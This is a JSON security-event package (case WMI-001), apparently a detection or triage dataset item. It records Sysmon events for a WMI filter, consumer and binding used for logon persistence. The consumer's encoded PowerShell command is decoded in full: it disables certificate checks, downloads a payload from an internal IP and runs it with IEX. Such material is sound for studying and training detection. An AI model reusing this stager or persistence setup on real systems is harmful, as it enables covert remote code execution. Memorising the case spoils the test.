@@ -1,0 +1,95 @@
+{
+  "schema_version": "1.0",
+  "case_id": "WMI-001",
+  "package_type": "neutral_security_event_package",
+  "observed_context": {
+    "computers": [
+      "host-01.corp.local"
+    ],
+    "users": [
+      "corp\\user-02",
+      "user-01"
+    ],
+    "time_window_utc": {
+      "start": "2020-05-02T08:00:07.755Z",
+      "end": "2020-05-02T08:00:07.833Z"
+    },
+    "event_count": 3,
+    "event_types_present": [
+      "wmi_event_consumer",
+      "wmi_event_filter",
+      "wmi_filter_to_consumer_binding"
+    ],
+    "sourcetypes_present": [
+      "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
+    ]
+  },
+  "main_alert": {
+    "evidence_id": "A0",
+    "is_triggering_alert": true,
+    "event_time_utc": "2020-05-02T08:00:07.755Z",
+    "event_type": "wmi_event_consumer",
+    "source_event": {
+      "provider": "Microsoft-Windows-Sysmon",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "event_code": 20,
+      "event_record_id": "790795"
+    },
+    "computer": "host-01.corp.local",
+    "attributes": {
+      "operation": "Created",
+      "consumer_name": " \"WindowsParentalControlMigration\"",
+      "destination": " \"powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA0ADoANAA0ADMALwBHAG8AUAByAG8ANQAvAGIAbABhAGMAawAvADIAMAAxADgALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=\"",
+      "user": "corp\\user-02"
+    }
+  },
+  "evidence_items": [
+    {
+      "evidence_id": "EV-001",
+      "event_time_utc": "2020-05-02T08:00:07.755Z",
+      "event_type": "wmi_event_filter",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 19,
+        "event_record_id": "790794"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "operation": "Created",
+        "filter_name": " \"WindowsParentalControlMigration\"",
+        "event_namespace": " \"root\\\\CimV2\"",
+        "query": " \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like '%user-02%'\"",
+        "user": "corp\\user-02"
+      }
+    },
+    {
+      "evidence_id": "EV-002",
+      "event_time_utc": "2020-05-02T08:00:07.833Z",
+      "event_type": "wmi_filter_to_consumer_binding",
+      "source_event": {
+        "provider": "Microsoft-Windows-Sysmon",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "event_code": 21,
+        "event_record_id": "790982"
+      },
+      "computer": "host-01.corp.local",
+      "attributes": {
+        "operation": "Created",
+        "consumer": " \"\\\\\\\\.\\\\ROOT\\\\subscription:CommandLineEventConsumer.Name=\\\"WindowsParentalControlMigration\\\"\"",
+        "filter": " \"\\\\\\\\.\\\\ROOT\\\\subscription:__EventFilter.Name=\\\"WindowsParentalControlMigration\\\"\"",
+        "user": "user-01"
+      }
+    }
+  ],
+  "deterministic_derivations": [
+    {
+      "derivation_id": "DER-001",
+      "derived_field": "decoded_consumer_command",
+      "value": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('https://192.168.0.4:443/GoPro5/black/2018/_rp')));IEX $MS",
+      "derivation_method": "base64 (UTF-16LE) PowerShell payload carried in the WMI CommandLineEventConsumer",
+      "source_evidence_id": "A0",
+      "source_field": "destination"
+    }
+  ]
+}
